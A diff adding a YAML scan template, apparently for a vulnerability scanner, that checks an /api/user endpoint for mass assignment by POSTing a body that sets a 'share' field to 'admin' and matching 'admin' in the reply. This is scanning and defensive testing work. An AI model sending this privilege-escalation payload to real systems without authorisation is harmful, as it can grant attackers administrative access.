@@ -1,0 +1,18 @@
+id: mass3-212
+name: 'Mass field share'
+severity: high
+type: active
+tags:
+  - mass-assignment
+  - auth
+  - api
+description: 'Unfiltered share on /api/user'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/user'
+    body: '{"name":"u1","share":"admin"}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'admin'
